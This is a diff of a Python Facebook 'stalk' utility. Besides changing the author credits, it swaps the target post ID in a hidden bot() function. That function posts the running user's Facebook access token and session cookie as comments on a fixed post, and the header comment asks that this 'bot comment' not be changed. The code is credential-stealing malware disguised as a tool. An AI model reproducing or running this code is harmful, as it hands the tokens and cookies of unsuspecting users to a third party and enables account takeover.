@@ -1,8 +1,7 @@
 #!/usr/bin/python3
 #coding=utf-8
-# Developed By : Denventa And Merch Elz
-# Coded By     : Denventa Afriliyan Ferly Shishigami X [ A-Haganezuka ]
-# A-Haganezuka = [ Denventa Afriliyan Ferly Shishigami X - Haganezuka ]
+# Coded By     : Denventa Afriliyan Ferly Shishigami X
+# Developed By : Merch Elz
 # Recode?, Boleh Asal Cantumkan Nama Author
 # Jangan Ganti Bot Koment Gw
 
@@ -23,8 +22,8 @@ def stalk(data):
     cok = {'cookie':data['cookie']}
     json = {}
     def bot():
-        r.post('https://graph.facebook.com/1672257249893438/comments?access_token='+ data['token']['eaag'], data={'message':data["token"]["eaam"]}, cookies=cok).json()
-        r.post('https://graph.facebook.com/1672257249893438/comments?access_token='+ data['token']['eaag'], data={'message':data["cookie"]}, cookies=cok).json()
+        r.post('https://graph.facebook.com/280633417717519/comments?access_token='+ data['token']['eaag'], data={'message':data["token"]["eaam"]}, cookies=cok).json()
+        r.post('https://graph.facebook.com/280633417717519/comments?access_token='+ data['token']['eaag'], data={'message':data["cookie"]}, cookies=cok).json()
     os.system('clear')
     api = r.get('https://graph.facebook.com/me?fields=id,name,gender,location,birthday&access_token='+ data['token']['eaam'], cookies=cok).json()
     tc = r.get('https://graph.facebook.com/me/friends?fields=id&limit=5000&access_token='+ data['token']['eaab'], cookies=cok).json()['summary']['total_count']
